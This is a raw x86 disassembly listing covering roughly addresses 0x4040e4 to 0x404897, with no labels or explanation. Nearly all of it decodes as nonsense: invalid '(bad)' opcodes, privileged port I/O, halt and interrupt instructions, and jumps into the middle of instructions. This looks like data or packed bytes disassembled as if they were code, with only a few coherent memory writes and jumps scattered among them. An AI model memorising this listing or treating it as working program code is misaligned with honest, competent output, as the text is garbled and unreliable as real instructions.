  4040e4:	je     0x4040ba
  4040e6:	adc    BYTE PTR [esi],0x11
  4040e9:	mov    edx,ecx
  4040eb:	not    BYTE PTR [esi]
  4040ed:	fld    TBYTE PTR [ebx]
  4040ef:	loop   0x40408d
  4040f1:	icebp  
  4040f2:	add    cl,BYTE PTR [ebp+esi*8-0x4be4474f]
  4040f9:	pop    esp
  4040fa:	mov    ds:0x1a3403be,al
  4040ff:	and    al,0x6b
  404101:	pminsw mm3,QWORD PTR [ecx-0x2bc47ea6]
  404108:	ja     0x40416f
  40410a:	scas   eax,DWORD PTR es:[edi]
  40410b:	ret    0xff22
  40410e:	mov    ch,0x1c
  404110:	dec    eax
  404111:	push   edx
  404112:	xchg   ebp,eax
  404113:	xor    ch,al
  404115:	pop    esi
  404116:	stc    
  404117:	sbb    eax,0xffeaf4a4
  40411c:	loop   0x404107
  40411e:	imul   edx,DWORD PTR [edx+0x633163b5],0x70fa41e0
  404128:	daa    
  404129:	jae    0x4040ee
  40412b:	and    al,BYTE PTR ds:0x28251672
  404131:	out    dx,eax
  404132:	sbb    DWORD PTR [eax],ebx
  404134:	adc    eax,0xd2600e33
  404139:	js     0x4040ec
  40413b:	adc    dl,bl
  40413d:	cwde   
  40413e:	inc    eax
  40413f:	cmp    edi,DWORD PTR [esi]
  404141:	pop    ebp
  404142:	mov    cl,0x6e
  404144:	dec    ecx
  404145:	outs   dx,DWORD PTR ds:[esi]
  404146:	inc    ecx
  404147:	ret    
  404148:	add    DWORD PTR [esi-0x6628ea27],ebp
  40414e:	mov    esi,0xd73b6c3a
  404153:	adc    esp,DWORD PTR [ebx-0x42]
  404156:	lsl    eax,WORD PTR [edi+edi*8-0x6ba4f41c]
  40415e:	push   es
  40415f:	push   esi
  404160:	sub    al,0x96
  404162:	cmp    ebx,DWORD PTR [ecx-0x36]
  404165:	shr    BYTE PTR [edi-0x35],cl
  404168:	stc    
  404169:	fnstenv [esi+0xb]
  40416c:	jo     0x404166
  40416e:	mov    ah,0x52
  404170:	mov    al,BYTE PTR [ecx+0x26b31f94]
  404176:	push   ebp
  404177:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404178:	imul   ebp,eax,0xed6ca0ee
  40417e:	idiv   bh
  404180:	(bad)  
  404181:	sub    eax,edi
  404183:	mov    ebp,0xc35e17fa
  404188:	inc    edi
  404189:	mov    ds:0xd0afa708,al
  40418e:	test   BYTE PTR [ebp+0x1a3797c2],0xb6
  404195:	sbb    DWORD PTR [eax],0x4b676c61
  40419b:	or     ecx,DWORD PTR [edi+0x1a]
  40419e:	rol    ebx,1
  4041a0:	imul   edx,DWORD PTR [ebx],0x2181f386
  4041a6:	push   0x27
  4041a8:	mov    al,0x1a
  4041aa:	cdq    
  4041ab:	sbb    cl,BYTE PTR [ebp+0x69]
  4041ae:	sbb    al,0x56
  4041b0:	add    eax,DWORD PTR [edx]
  4041b2:	adc    ebx,ebp
  4041b4:	test   DWORD PTR [eax+0x32],edx
  4041b7:	sar    DWORD PTR [ebp-0x54e7f7b2],cl
  4041bd:	ja     0x4041bd
  4041bf:	jp     0x404212
  4041c1:	sub    BYTE PTR [eax-0x30],dl
  4041c4:	or     eax,0x2056bf03
  4041c9:	aam    0xe1
  4041cb:	pop    esp
  4041cc:	in     eax,0xda
  4041ce:	jb     0x4041a5
  4041d0:	mov    ?,WORD PTR [esi+0x30]
  4041d3:	addr16 mov gs,ebx
  4041d6:	out    dx,al
  4041d7:	nop
  4041d8:	rol    BYTE PTR [edx-0x54],0x52
  4041dc:	cmp    ah,BYTE PTR [edx-0x49]
  4041df:	clc    
  4041e0:	int3   
  4041e1:	adc    ecx,DWORD PTR [ecx]
  4041e3:	xchg   ebp,eax
  4041e4:	pop    eax
  4041e5:	or     DWORD PTR [eax+0x18],ebx
  4041e8:	cmp    BYTE PTR [edx+0x31],dl
  4041eb:	ret    0x1a77
  4041ee:	fsubrp st(4),st
  4041f0:	inc    esp
  4041f1:	mov    ah,0x69
  4041f3:	loop   0x40423b
  4041f5:	outs   dx,BYTE PTR ds:[esi]
  4041f6:	lods   eax,DWORD PTR ds:[esi]
  4041f7:	rcl    DWORD PTR [ebp-0x41],1
  4041fa:	jg     0x4041e7
  4041fc:	push   edi
  4041fd:	add    ecx,DWORD PTR [eax-0x66]
  404200:	mov    ebx,gs
  404202:	adc    al,0xaf
  404204:	sbb    al,0x83
  404206:	fcomi  st,st(0)
  404208:	sbb    DWORD PTR [edx-0x33],esi
  40420b:	test   BYTE PTR [esp+eax*8],bl
  40420e:	in     al,dx
  40420f:	pop    ecx
  404210:	jne    0x404198
  404212:	pop    es
  404213:	mov    WORD PTR [edx-0xd688366],?
  404219:	outs   dx,BYTE PTR ds:[esi]
  40421a:	cmp    DWORD PTR [ebp+0x63],edi
  40421d:	or     ah,al
  40421f:	neg    DWORD PTR [edi+ecx*8-0x74]
  404223:	inc    ebx
  404224:	fdiv   st(4),st
  404226:	fwait
  404227:	push   ecx
  404228:	imul   edi,esi,0xffffffd3
  40422b:	push   edi
  40422c:	cmp    al,0x35
  40422e:	xor    esi,DWORD PTR [ebp-0x60]
  404231:	cmc    
  404232:	sbb    DWORD PTR [ebp-0x46a7a7f8],esp
  404238:	jle    0x40427a
  40423a:	cmp    eax,0x40
  40423d:	mov    DWORD PTR ds:0x42fe6e,0x793d
  404247:	jmp    0x4045a7
  40424c:	leave  
  40424d:	daa    
  40424e:	rcl    BYTE PTR [esi],1
  404250:	repnz aad 0xf1
  404253:	jecxz  0x404232
  404255:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404256:	dec    ebp
  404257:	jne    0x4fc57bea
  40425d:	sbb    BYTE PTR [eax+0x70],dh
  404260:	cmp    eax,0x9870707d
  404265:	ins    BYTE PTR es:[edi],dx
  404266:	test   eax,0x6eac2220
  40426b:	sbb    DWORD PTR [esi+esi*1],0x16b63847
  404272:	aaa    
  404273:	mov    WORD PTR [esp+ecx*8+0x49804e9e],es
  40427a:	cwde   
  40427b:	pop    ecx
  40427c:	out    0xdc,ax
  40427f:	dec    edx
  404280:	test   ecx,eax
  404282:	out    0x34,eax
  404284:	push   ss
  404285:	cli    
  404286:	dec    eax
  404287:	inc    eax
  404288:	scas   eax,DWORD PTR es:[edi]
  404289:	ins    DWORD PTR es:[edi],dx
  40428a:	jbe    0x404218
  40428c:	retf   0x3d40
  40428f:	in     eax,dx
  404290:	imul   esp,DWORD PTR [ecx-0x2131be1e],0xffffffea
  404297:	nop
  404298:	push   esi
  404299:	clc    
  40429a:	push   ds
  40429b:	(bad)  
  40429c:	cli    
  40429d:	push   edi
  40429e:	xchg   esi,eax
  40429f:	mov    eax,0xf54f4b80
  4042a4:	and    ch,BYTE PTR [ecx]
  4042a6:	fwait
  4042a7:	sbb    al,0x22
  4042a9:	fidiv  DWORD PTR [edx]
  4042ab:	hlt    
  4042ac:	in     eax,0xc2
  4042ae:	mov    ds,WORD PTR [ecx+0x171d8bf1]
  4042b4:	xor    eax,0xe3d6282e
  4042b9:	xchg   edx,eax
  4042ba:	shr    DWORD PTR [esi-0x3e68476b],1
  4042c0:	test   BYTE PTR [ebp-0x71],bh
  4042c3:	loope  0x404262
  4042c5:	lahf   
  4042c6:	pop    edx
  4042c7:	xor    edi,DWORD PTR [ecx+0x3e5d18bd]
  4042cd:	lock sub eax,0x74a94703
  4042d3:	pop    esp
  4042d4:	in     eax,dx
  4042d5:	add    al,0x2a
  4042d7:	lahf   
  4042d8:	jbe    0x404333
  4042da:	dec    esi
  4042db:	add    eax,ebp
  4042dd:	jmp    DWORD PTR ds:0xd6f779a9
  4042e3:	iret   
  4042e4:	mov    ebp,0x63a8c84c
  4042e9:	or     ebp,eax
  4042eb:	adc    ecx,DWORD PTR [edx]
  4042ed:	sbb    esp,DWORD PTR [ebp+0x36]
  4042f0:	and    ah,BYTE PTR [esi]
  4042f2:	aas    
  4042f3:	dec    ebp
  4042f4:	daa    
  4042f5:	mov    BYTE PTR [ecx-0x7dc57f0e],0xf6
  4042fc:	jle    0x4042c6
  4042fe:	cmc    
  4042ff:	fisubr DWORD PTR [edi]
  404301:	mov    ds:0xe7de26af,eax
  404306:	mov    ebp,DWORD PTR [edi+0x60]
  404309:	adc    DWORD PTR [ecx+0x2c],eax
  40430c:	jne    0x4042ea
  40430e:	jmp    DWORD PTR [edx-0x74]
  404311:	inc    ebp
  404312:	lock test al,0x87
  404315:	jp     0x404321
  404317:	push   edi
  404318:	out    0x64,eax
  40431a:	inc    ebx
  40431b:	adc    eax,0x45b900ca
  404320:	inc    ecx
  404321:	addr16 fcmove st,st(0)
  404324:	pop    ebp
  404325:	mov    edi,ebp
  404327:	(bad)  
  404328:	or     al,0x9
  40432a:	sub    al,0x47
  40432c:	imul   edi,DWORD PTR [ecx+0x61],0xffffff9f
  404330:	in     al,0xce
  404332:	xchg   esp,eax
  404333:	daa    
  404334:	jecxz  0x4042dc
  404336:	es mov bl,0x48
  404339:	ds js  0x40437f
  40433c:	cmp    esi,DWORD PTR [ebx+0x692ee42b]
  404342:	mov    bh,0xb5
  404344:	ja     0x404308
  404346:	ja     0x40434f
  404348:	adc    esi,ebx
  40434a:	fwait
  40434b:	popf   
  40434c:	cmc    
  40434d:	xor    al,0x3
  40434f:	pop    ebx
  404350:	jmp    0x7b7d3ffa
  404355:	push   ecx
  404356:	in     eax,0x57
  404358:	aas    
  404359:	jg     0x40436a
  40435b:	xor    BYTE PTR [ebx*8-0x47487546],ah
  404362:	push   esi
  404363:	lods   al,BYTE PTR ds:[esi]
  404364:	adc    BYTE PTR [ebp-0x7c746b94],cl
  40436a:	mov    al,ds:0x3e9f5cf2
  40436f:	sub    BYTE PTR [edx+0xefcf4ed],dl
  404375:	std    
  404376:	icebp  
  404377:	cmp    bl,BYTE PTR [edi]
  404379:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40437a:	pop    ds
  40437b:	clc    
  40437c:	fptan  
  40437e:	add    ch,BYTE PTR [ecx]
  404380:	and    eax,DWORD PTR [ecx]
  404382:	ins    BYTE PTR es:[edi],dx
  404383:	cli    
  404384:	jns    0x4043ce
  404386:	retf   
  404387:	clc    
  404388:	int    0x62
  40438a:	xchg   esp,eax
  40438b:	jbe    0x40433e
  40438d:	jge    0x4043a5
  40438f:	es mov edx,0x7c1c2195
  404395:	je     0x4043c6
  404397:	sahf   
  404398:	jg     0x40434f
  40439a:	clc    
  40439b:	pop    ebp
  40439c:	stc    
  40439d:	mov    edx,0xf53279a5
  4043a2:	popf   
  4043a3:	inc    esp
  4043a4:	pop    ss
  4043a5:	sti    
  4043a6:	xlat   BYTE PTR ds:[ebx]
  4043a7:	ret    
  4043a8:	cmp    eax,0x62788dba
  4043ae:	jecxz  0x404346
  4043b0:	popa   
  4043b1:	sahf   
  4043b2:	ret    0xa722
  4043b5:	pusha  
  4043b6:	shr    ebx,1
  4043b8:	sub    BYTE PTR [edx-0x45],dh
  4043bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4043bc:	sbb    eax,0x856a00a2
  4043c1:	push   esi
  4043c2:	ins    BYTE PTR es:[edi],dx
  4043c3:	jecxz  0x404393
  4043c5:	out    0x89,al
  4043c7:	push   esi
  4043c8:	outs   dx,BYTE PTR ds:[esi]
  4043c9:	imul   ecx,DWORD PTR [ebx],0xbada8514
  4043cf:	int3   
  4043d0:	stos   DWORD PTR es:[edi],eax
  4043d1:	cli    
  4043d2:	fild   QWORD PTR [ecx+0xbc6620c]
  4043d8:	cli    
  4043d9:	stos   DWORD PTR es:[edi],eax
  4043da:	push   esi
  4043db:	enter  0x9121,0xe3
  4043df:	daa    
  4043e0:	or     al,0x26
  4043e2:	ja     0x404452
  4043e4:	enter  0xa5d6,0xf
  4043e8:	xor    al,0xcb
  4043ea:	popa   
  4043eb:	add    eax,0x84fa8e93
  4043f0:	(bad)  
  4043f1:	push   esp
  4043f2:	jns    0x4043d4
  4043f4:	jl     0x4043be
  4043f6:	lea    esp,[ecx]
  4043f8:	imul   edx,edi,0xf0745449
  4043fe:	nop
  4043ff:	fucomip st,st(3)
  404401:	adc    BYTE PTR [eax+0x26],cl
  404404:	push   ebp
  404405:	jp     0x4043f5
  404407:	(bad)  
  404408:	pop    ecx
  404409:	or     dh,BYTE PTR [edi-0x5a]
  40440c:	mov    BYTE PTR [edi-0x28],cl
  40440f:	(bad)  
  404413:	jmp    0x58430e22
  404418:	inc    edx
  404419:	mov    BYTE PTR [edi-0xf],bh
  40441c:	test   al,0xd1
  40441e:	scas   al,BYTE PTR es:[edi]
  40441f:	xor    dl,BYTE PTR [eax-0x5eec6cd]
  404425:	lods   al,BYTE PTR ds:[esi]
  404426:	mov    ebx,0xca0c753a
  40442b:	in     eax,0xbc
  40442d:	fdivr  st,st(1)
  40442f:	pop    ebx
  404430:	push   edi
  404431:	les    edx,FWORD PTR [esi]
  404433:	cmp    DWORD PTR [edx-0x61],edi
  404436:	ret    0x87ce
  404439:	data16 add al,0x2c
  40443c:	nop
  40443d:	jo     0x404436
  40443f:	push   ebp
  404440:	ds std 
  404442:	sar    BYTE PTR [edx-0x3e],1
  404445:	mov    ebp,0xb5f762cb
  40444a:	jl     0x40446c
  40444c:	mov    esi,0x9e729a7f
  404451:	je     0x404439
  404453:	jle    0x404415
  404455:	jns    0x40449d
  404457:	jns    0x404474
  404459:	adc    edi,DWORD PTR [edx+ecx*8]
  40445c:	arpl   WORD PTR [ecx],si
  40445e:	or     BYTE PTR [esi-0x3d],0x7d
  404462:	repnz or ebx,DWORD PTR [ebx]
  404465:	icebp  
  404466:	test   eax,0xac73eff1
  40446b:	dec    esp
  40446c:	int3   
  40446d:	rcr    DWORD PTR [esi+0x2c],0x95
  404471:	push   cs
  404472:	mov    ebx,0xf29335a
  404477:	sbb    dh,BYTE PTR ds:0xc5218911
  40447d:	sbb    dl,cl
  40447f:	std    
  404480:	cmp    BYTE PTR [esi],bh
  404482:	aas    
  404483:	sub    bh,BYTE PTR [edi+0x39]
  404486:	mov    esp,DWORD PTR [eax+ecx*2+0x17]
  40448a:	out    dx,eax
  40448b:	xor    dl,cl
  40448d:	and    DWORD PTR [edi-0x4f],0xf9da9569
  404494:	adc    BYTE PTR [esi],0x90
  404497:	mov    edx,0xb77eb313
  40449c:	dec    edi
  40449d:	pop    eax
  40449e:	xor    DWORD PTR ds:0xb8f87097,edi
  4044a4:	jo     0x40442b
  4044a6:	dec    edx
  4044a7:	mov    DWORD PTR [eax-0x21],edx
  4044aa:	jg     0x4044d2
  4044ac:	sub    eax,0x8f5d931d
  4044b1:	xchg   BYTE PTR [eax-0x252aaa5d],al
  4044b7:	jl     0x404538
  4044b9:	push   ebx
  4044ba:	sbb    eax,0xa7659091
  4044bf:	lock inc esi
  4044c1:	push   ebp
  4044c2:	mul    ah
  4044c4:	ror    BYTE PTR [edi-0x25],1
  4044c7:	jbe    0x404540
  4044c9:	or     bh,BYTE PTR [ecx]
  4044cb:	xlat   BYTE PTR ds:[ebx]
  4044cc:	xchg   DWORD PTR [ebx+0x36],esp
  4044cf:	xchg   DWORD PTR [ecx-0x46a46f21],ebx
  4044d5:	xor    esi,DWORD PTR [edx-0x1]
  4044d8:	sar    DWORD PTR [eax],0xd8
  4044db:	add    eax,0xab0a391
  4044e0:	dec    edi
  4044e1:	cmp    BYTE PTR [esi],0x12
  4044e4:	adc    al,0xcd
  4044e6:	cmp    BYTE PTR [edx-0x50],bh
  4044e9:	adc    bl,BYTE PTR [ebx+edx*8+0x40b71132]
  4044f0:	or     al,BYTE PTR [edi]
  4044f2:	nop
  4044f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044f4:	adc    al,0x13
  4044f6:	sub    eax,0xb4873621
  4044fb:	mul    BYTE PTR [eax-0x3b36caac]
  404501:	add    edx,DWORD PTR [ebx+0x2c3a9709]
  404507:	pop    ds
  404508:	mov    bl,0xf2
  40450a:	cld    
  40450b:	(bad)  
  40450c:	shl    DWORD PTR [esi+0x6f],cl
  40450f:	rcl    BYTE PTR [edi],cl
  404511:	out    dx,eax
  404512:	sahf   
  404513:	sbb    eax,0xcd7564f5
  404518:	sub    eax,0x749c290a
  40451d:	lods   eax,DWORD PTR ds:[esi]
  40451e:	sbb    DWORD PTR [ecx+0x415a27bd],ebp
  404524:	in     al,dx
  404525:	sbb    ebp,ebp
  404527:	pop    ebx
  404528:	cs ins BYTE PTR es:[edi],dx
  40452a:	pop    edi
  40452b:	icebp  
  40452c:	fnsave [ebp+0x23]
  40452f:	jp     0x404585
  404531:	dec    ecx
  404532:	scas   eax,DWORD PTR es:[edi]
  404533:	je     0x4044f1
  404535:	or     DWORD PTR [ebx-0x1f],0x5
  404539:	and    dl,BYTE PTR [ecx+eax*4]
  40453c:	add    esp,ecx
  40453e:	pop    edx
  40453f:	in     al,0x0
  404541:	inc    ebx
  404542:	jl     0x404577
  404544:	lods   al,BYTE PTR ds:[esi]
  404545:	imul   edx,DWORD PTR [eax-0x5c],0xffffffeb
  404549:	cld    
  40454a:	call   0x370437f
  40454f:	mov    edi,0x91c68f32
  404554:	mov    bl,0x85
  404556:	jmp    0x4045b8
  404558:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404559:	retf   0x6077
  40455c:	pop    ds
  40455d:	mov    bl,0xa7
  40455f:	stos   DWORD PTR es:[edi],eax
  404560:	out    0xb1,al
  404562:	dec    ecx
  404563:	or     al,0x2e
  404565:	adc    ah,0x35
  404568:	int    0xcc
  40456a:	clc    
  40456b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40456c:	stos   DWORD PTR es:[edi],eax
  40456d:	fnstsw WORD PTR [edi]
  40456f:	add    al,BYTE PTR [eax-0x7c]
  404572:	inc    esi
  404573:	mov    ebx,ss
  404575:	loopne 0x4045f0
  404577:	jg     0x404504
  404579:	in     al,dx
  40457a:	movd   mm0,DWORD PTR [ecx+eiz*8]
  40457e:	add    DWORD PTR [edi],esi
  404580:	push   ds
  404581:	inc    esp
  404582:	je     0x404589
  404584:	cmc    
  404585:	and    ah,ah
  404587:	loop   0x40451d
  404589:	pop    ecx
  40458b:	test   DWORD PTR [ebx],esi
  40458d:	adc    ah,BYTE PTR [edx]
  40458f:	mov    edi,0xea4fcee8
  404594:	inc    ecx
  404595:	(bad)  
  404596:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404597:	inc    esp
  404598:	push   esp
  404599:	jmp    0xb97788a3
  40459e:	outs   dx,BYTE PTR ds:[esi]
  40459f:	aam    0xc7
  4045a1:	mov    ebp,0xabb161f8
  4045a6:	sti    
  4045a7:	jb     0x403ebe
  4045ad:	and    DWORD PTR ds:0x42fe82,edx
  4045b3:	mov    edx,DWORD PTR [ebp-0x8]
  4045b6:	jmp    0x404916
  4045bb:	push   ss
  4045bc:	jge    0x404620
  4045be:	add    BYTE PTR [ecx+0x73],dh
  4045c1:	jb     0x4045c8
  4045c3:	inc    edi
  4045c4:	sbb    ch,BYTE PTR [ecx+edx*2]
  4045c7:	sub    eax,0xc19a6c0
  4045cc:	and    al,0x70
  4045ce:	jo     0x40460d
  4045d0:	jge    0x404642
  4045d2:	jo     0x4045f1
  4045d4:	mov    esp,0x56bb15c8
  4045d9:	sbb    cl,BYTE PTR [esi]
  4045db:	fmul   DWORD PTR [ebp+0x56]
  4045de:	add    al,0xe9
  4045e0:	out    dx,al
  4045e1:	mov    ds:0x8589e8dc,al
  4045e6:	ret    0x6744
  4045e9:	xor    eax,0x59ecd2dd
  4045ee:	mov    bl,0x9f
  4045f0:	pop    edx
  4045f1:	aam    0xdb
  4045f3:	pop    es
  4045f4:	out    dx,al
  4045f5:	xchg   edi,eax
  4045f6:	or     esi,DWORD PTR [edi+0x5]
  4045f9:	clc    
  4045fa:	and    eax,0xb7cf903b
  4045ff:	inc    ebp
  404600:	xor    DWORD PTR [edi-0x3a],ebp
  404603:	test   DWORD PTR [ebp+eax*4+0x4e88beef],eax
  40460a:	add    DWORD PTR [esi],0x2c
  40460d:	adc    al,0x77
  40460f:	mov    eax,0x7e6573cf
  404614:	or     bh,ch
  404616:	and    al,al
  404618:	in     eax,0xbb
  40461a:	retf   0xa70b
  40461d:	jge    0x404625
  40461f:	mov    ah,0x15
  404621:	fcomp  st(6)
  404623:	mov    ds:0xdb46f03e,eax
  404628:	mov    BYTE PTR [edx-0x2814c5da],al
  40462e:	leave  
  40462f:	stos   DWORD PTR es:[edi],eax
  404630:	inc    edi
  404631:	mov    edi,0xdf7b706
  404636:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404637:	xor    bl,cl
  404639:	jge    0x40460c
  40463b:	popf   
  40463c:	pop    esi
  40463d:	gs jne 0x4045d4
  404640:	loopne 0x404693
  404642:	(bad)  
  404643:	and    ch,BYTE PTR [ebp+0x676ba066]
  404649:	out    dx,eax
  40464a:	inc    edx
  40464b:	and    al,0x6a
  40464d:	push   cs
  40464e:	push   ss
  40464f:	ror    BYTE PTR [eax+0x73],0x59
  404653:	lods   al,BYTE PTR ds:[esi]
  404654:	dec    edi
  404655:	mov    ds:0xbf57e3ff,eax
  40465a:	push   edi
  40465b:	sub    edi,DWORD PTR [ebp+0x43ab3470]
  404661:	lods   eax,DWORD PTR ds:[esi]
  404662:	sbb    esp,DWORD PTR [edx+0x6c366ee6]
  404668:	sbb    cl,dl
  40466a:	jmp    0x9e02:0x8914128b
  404671:	or     BYTE PTR [ebp+0x4fb631ef],ch
  404677:	inc    eax
  404678:	fstp   DWORD PTR [edi+0x241205d2]
  40467e:	outs   dx,BYTE PTR ds:[esi]
  40467f:	addr16 jbe 0x404628
  404682:	(bad)  
  404683:	xor    BYTE PTR [eax+ebx*2+0x45],al
  404687:	ja     0x404637
  404689:	scas   eax,DWORD PTR es:[edi]
  40468a:	das    
  40468b:	pop    ds
  40468c:	call   0x6c91:0x57c16bde
  404693:	bound  ebp,QWORD PTR [eax+edi*2-0x52]
  404697:	pop    ecx
  404698:	jae    0x40468f
  40469a:	ss inc esi
  40469c:	sahf   
  40469d:	cmc    
  40469e:	cdq    
  40469f:	pop    ss
  4046a0:	ins    DWORD PTR es:[edi],dx
  4046a1:	je     0x404647
  4046a3:	loopne 0x404635
  4046a5:	lds    esp,FWORD PTR [ecx]
  4046a7:	jecxz  0x40464b
  4046a9:	daa    
  4046aa:	mov    bh,0x3d
  4046ac:	pop    esi
  4046ad:	mov    ch,0x3d
  4046af:	ja     0x40465f
  4046b1:	sbb    DWORD PTR [esi+0x6d78c9a9],ebp
  4046b7:	test   dh,ah
  4046b9:	pop    esp
  4046ba:	and    DWORD PTR [ecx],0xffffffe0
  4046bd:	shl    esp,cl
  4046bf:	mov    DWORD PTR [eax],edi
  4046c1:	and    edi,edx
  4046c3:	add    al,0xb5
  4046c5:	in     al,0x23
  4046c7:	jne    0x40473e
  4046c9:	sub    edi,DWORD PTR [edi*2+0x4a30e04d]
  4046d0:	push   ss
  4046d1:	xor    DWORD PTR [edi],0xb7e4d489
  4046d7:	fdiv   st(5),st
  4046d9:	mov    edi,0x8a77a9bb
  4046de:	repnz inc esi
  4046e0:	mov    ds:0x6a8d861f,al
  4046e5:	pop    ebp
  4046e6:	daa    
  4046e7:	pop    ecx
  4046e8:	xchg   ebp,eax
  4046e9:	cmp    esp,edi
  4046eb:	fidiv  WORD PTR [edx-0x3275abd2]
  4046f1:	mov    esi,0xeb1c6d32
  4046f6:	adc    eax,esp
  4046f8:	nop
  4046f9:	imul   DWORD PTR [eax+edi*1+0x4e]
  4046fd:	gs aam 0x8b
  404700:	iret   
  404701:	xor    DWORD PTR [edx],0x5c
  404704:	cdq    
  404705:	not    BYTE PTR [ecx-0x58]
  404708:	cs inc esi
  40470a:	mov    bl,BYTE PTR [eax-0x21f60916]
  404710:	in     eax,dx
  404711:	jb     0x404781
  404713:	scas   eax,DWORD PTR es:[edi]
  404714:	dec    edx
  404715:	cmp    BYTE PTR [esp+ebx*1+0x73e54e77],0xc6
  40471d:	popf   
  40471e:	inc    ecx
  40471f:	mov    eax,ds:0x882f8f6
  404724:	xchg   edi,eax
  404725:	pop    ecx
  404726:	inc    eax
  404727:	rcr    BYTE PTR [edi+0x265b66fd],1
  40472d:	and    esi,DWORD PTR [edx-0x208e510b]
  404733:	mov    al,0x9f
  404735:	loop   0x4046fd
  404737:	sub    esi,DWORD PTR [edx+0x4e9d86fd]
  40473d:	pop    edx
  40473e:	mov    cl,0xf0
  404740:	or     eax,0xb8395f3d
  404745:	jne    0x4047c2
  404747:	js     0x404728
  404749:	out    0xc9,al
  40474b:	and    BYTE PTR [edi+0x1f414063],0x5f
  404752:	icebp  
  404753:	add    BYTE PTR es:[ecx-0x2201edd3],cl
  40475a:	add    eax,0xe928a2ec
  40475f:	bound  ebx,QWORD PTR [ebp+0x33]
  404762:	ds xchg ebx,edx
  404765:	sbb    DWORD PTR [eax-0x3f],ebx
  404768:	inc    ebx
  404769:	outs   dx,DWORD PTR ds:[esi]
  40476a:	mov    ebx,DWORD PTR [edi+0x56]
  40476d:	ret    
  40476e:	(bad)  
  40476f:	ficomp WORD PTR [eax]
  404771:	fs dec esi
  404773:	fcomp  QWORD PTR [edi]
  404775:	push   ebp
  404776:	add    ah,BYTE PTR ds:0x711f1e6c
  40477c:	push   ebx
  40477d:	jns    0x40470b
  40477f:	fistp  QWORD PTR [eax]
  404781:	pop    ebx
  404782:	repnz mov bh,0x10
  404785:	cli    
  404786:	xchg   ebx,eax
  404787:	xor    al,0xed
  404789:	sar    BYTE PTR ds:0x8ec495f9,cl
  40478f:	xor    bh,ch
  404791:	cmp    BYTE PTR [esi],ah
  404793:	push   edx
  404794:	and    DWORD PTR [edi+0x0],ebx
  404797:	xor    al,0x55
  404799:	inc    edx
  40479a:	shl    edi,cl
  40479c:	aad    0x49
  40479e:	xor    al,0x22
  4047a0:	fwait
  4047a1:	inc    edi
  4047a2:	leave  
  4047a3:	xchg   ebp,eax
  4047a4:	sahf   
  4047a5:	lock (bad) 
  4047a7:	aam    0xa5
  4047a9:	test   DWORD PTR [edi],ecx
  4047ab:	adc    BYTE PTR cs:[edi],0x0
  4047af:	jbe    0x40475c
  4047b1:	sub    eax,0x8a79f586
  4047b6:	mov    WORD PTR [ebp-0x7525c8f3],gs
  4047bc:	dec    ebx
  4047bd:	fcomp  st(6)
  4047bf:	iret   
  4047c0:	and    edi,ebp
  4047c2:	mov    ecx,0x551c29ad
  4047c7:	(bad)  [edx]
  4047c9:	push   es
  4047ca:	popf   
  4047cb:	or     al,0x8
  4047cd:	push   ecx
  4047ce:	out    dx,al
  4047cf:	jns    0x404837
  4047d1:	sub    DWORD PTR [edi-0x7b],edi
  4047d4:	dec    esi
  4047d5:	mov    ds:0x9d23e12f,eax
  4047da:	push   cs
  4047db:	push   cs
  4047dc:	ins    DWORD PTR es:[edi],dx
  4047dd:	pop    ds
  4047de:	fimul  WORD PTR [esi+eax*1-0x1629ec76]
  4047e5:	dec    esi
  4047e6:	lods   al,BYTE PTR ds:[esi]
  4047e7:	idiv   bl
  4047e9:	std    
  4047ea:	fucom  st(5)
  4047ec:	push   edi
  4047ed:	inc    esi
  4047ee:	ja     0x4047d4
  4047f0:	push   edi
  4047f1:	(bad)  
  4047f2:	repz xchg esi,eax
  4047f4:	jmp    0x40485c
  4047f6:	inc    ebp
  4047f7:	fs pop ds
  4047f9:	dec    ebp
  4047fa:	push   edi
  4047fb:	mov    bl,ch
  4047fd:	icebp  
  4047fe:	inc    ebp
  4047ff:	mov    edx,0x203d3843
  404804:	or     edi,edi
  404806:	sub    bl,cl
  404808:	xor    dl,al
  40480a:	lods   eax,DWORD PTR ds:[esi]
  40480b:	pushf  
  40480c:	inc    esi
  40480d:	inc    edx
  40480e:	pop    ss
  40480f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404810:	or     BYTE PTR [eax],ch
  404812:	stc    
  404813:	stos   DWORD PTR es:[edi],eax
  404814:	xor    eax,0xc564efdb
  404819:	fcmovne st,st(7)
  40481b:	test   DWORD PTR [edi-0x2f653bce],0xdf94f8de
  404825:	ficom  WORD PTR [edx-0x7f447b7c]
  40482b:	sbb    DWORD PTR [esi+0x6e],ebx
  40482e:	ins    BYTE PTR es:[edi],dx
  40482f:	arpl   WORD PTR [edx+0xc715fa0],bp
  404835:	sbb    BYTE PTR [ebx+eiz*4-0x6e],cl
  404839:	and    ebp,DWORD PTR [esi-0xad5c9ae]
  40483f:	inc    esp
  404840:	add    al,0xc4
  404842:	inc    ebx
  404843:	fsubr  DWORD PTR [ebp+0x6661a548]
  404849:	mov    DWORD PTR [edi-0x2],edx
  40484c:	mov    bl,0x25
  40484e:	or     ch,BYTE PTR [ecx+0x470bc584]
  404854:	mov    al,0x53
  404856:	xchg   DWORD PTR [ebx+0x313e945f],esp
  40485c:	mov    ecx,0x755d7748
  404861:	push   es
  404862:	xchg   edi,eax
  404863:	inc    edi
  404864:	mov    ch,0x69
  404866:	ja     0x404884
  404868:	loope  0x40488c
  40486a:	sub    BYTE PTR [ecx],ah
  40486c:	test   eax,0x7b1aa2db
  404871:	mov    dh,0xe2
  404873:	ins    DWORD PTR es:[edi],dx
  404874:	enter  0x566d,0x9b
  404878:	pop    ds
  404879:	scas   eax,DWORD PTR es:[edi]
  40487a:	dec    esp
  40487b:	cli    
  40487c:	sbb    al,0x38
  40487e:	cli    
  40487f:	(bad)
  404882:	call   0xea32:0xa765afb4
  404889:	leave  
  40488a:	test   eax,esp
  40488c:	inc    eax
  40488d:	nop
  40488e:	or     BYTE PTR [ecx-0x51dfc9e0],0xe8
  404895:	lahf   
  404896:	push   es
  404897:	mov    ch,BYTE PTR [ebx+esi*4+0x6c366aa7]
